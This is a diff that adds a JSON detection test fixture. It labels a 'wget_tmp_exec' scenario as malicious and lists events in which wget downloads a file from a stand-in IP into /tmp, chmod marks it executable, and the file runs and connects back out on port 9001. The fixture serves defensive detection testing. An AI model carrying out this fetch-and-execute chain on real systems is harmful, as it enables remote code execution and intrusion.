@@ -1,0 +1,12 @@
+{
+  "name": "wget_tmp_exec",
+  "ground_truth": { "malicious": true, "techniques": ["T1105", "T1222.002", "T1204.002"] },
+  "events": [
+    {"id":"w1","host_id":"h2","boot_id":"b","ts_unix_ns":1700000000000000000,"kind":"exec","pid":200,"start_ticks":200,"ppid":20,"parent_start_ticks":20,"exe":"/bin/bash"},
+    {"id":"w2","host_id":"h2","boot_id":"b","ts_unix_ns":1700000001000000000,"kind":"exec","pid":201,"start_ticks":201,"ppid":200,"parent_start_ticks":200,"exe":"/usr/bin/wget","args":"http://198.51.100.7/m -O /tmp/m"},
+    {"id":"w3","host_id":"h2","boot_id":"b","ts_unix_ns":1700000002000000000,"kind":"file.write","pid":201,"start_ticks":201,"exe":"/usr/bin/wget","path":"/tmp/m"},
+    {"id":"w4","host_id":"h2","boot_id":"b","ts_unix_ns":1700000003000000000,"kind":"exec","pid":202,"start_ticks":202,"ppid":200,"parent_start_ticks":200,"exe":"/usr/bin/chmod","args":"+x /tmp/m"},
+    {"id":"w5","host_id":"h2","boot_id":"b","ts_unix_ns":1700000004000000000,"kind":"exec","pid":203,"start_ticks":203,"ppid":200,"parent_start_ticks":200,"exe":"/tmp/m"},
+    {"id":"w6","host_id":"h2","boot_id":"b","ts_unix_ns":1700000005000000000,"kind":"net.connect","pid":203,"start_ticks":203,"exe":"/tmp/m","raddr":"198.51.100.7","rport":9001}
+  ]
+}
